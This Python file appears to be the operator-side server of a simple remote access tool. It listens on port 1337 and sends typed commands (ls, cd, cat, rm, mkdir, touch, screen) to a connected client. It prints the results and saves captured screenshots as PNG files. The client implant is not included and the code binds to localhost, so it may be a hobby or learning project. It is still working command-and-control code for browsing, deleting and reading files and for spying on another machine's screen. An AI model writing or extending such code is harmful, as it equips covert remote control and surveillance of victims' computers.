import socket
import time
import io
import base64
import os
from PIL import Image
from colorama import Fore, Style, init

ADRESSE = 'localhost'
PORT = 1337

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ADRESSE, PORT))
server.listen(1)
print(f"Wainting for connection on {ADRESSE}:{PORT}...")
client, adresseClient = server.accept()
print(f"Connection from {adresseClient}")


def recieveResponse():
    data = b""
    while True:
        part = client.recv(1024)
        data += part
        if len(part) < 1024:
            # Either 0 or end of data
            break
    return data


def closeConnection():
    print('Closing connection')
    client.close()
    print('Closing server')
    server.close()

def recieveDataFromScreen():
    dataScreen = b""
    while True:
        part = client.recv(1024)
        dataScreen += part
        if len(part) < 1024:
            break
    return dataScreen


def recieveTextResponse():
    data = recieveResponse()
    return data.decode('utf-8')


def sendCmd(cmd):
    cmd = cmd.encode('utf-8')
    n = client.send(cmd)
    if n != len(cmd):
        print('Error while sending.')
        return
    else:
        # If theres a response from the client print it
        if cmd.decode('utf-8').split()[0] != 'screen':
            print("--------------------")
            print(recieveTextResponse())
            print("--------------------")
        time.sleep(0.1)


def writePngFile():
    img_bytes = base64.b64decode(recieveResponse())
    with open("screen.png", 'wb') as f:
        f.write(img_bytes)
    return


while True:
    cmd = input('\nCommand to send : ')
    cmd_arr = cmd.split()

    try:
        match cmd_arr[0]:
            case 'close':
                sendCmd(cmd)
            case 'mkdir':
                sendCmd(cmd)
            case 'touch':
                sendCmd(cmd)
            case 'ls':
                sendCmd(cmd)
            case 'cd':
                sendCmd(cmd)
            case 'rm':
                sendCmd(cmd)
            case 'rmdir':
                sendCmd(cmd)
            case 'pwd':
                sendCmd(cmd)
            case 'screen':
                sendCmd(cmd)
                time.sleep(1.5)
                writePngFile()
            case 'clear':
                os.system('cls')
            case 'cat':
                if len(cmd_arr) < 2:
                    print("Please enter a filename")
                else:
                    sendCmd(cmd)
    except IndexError:
        print('Error while parsing command.')
        continue

    if cmd == 'close' or cmd == 'exit':
        closeConnection()
        break
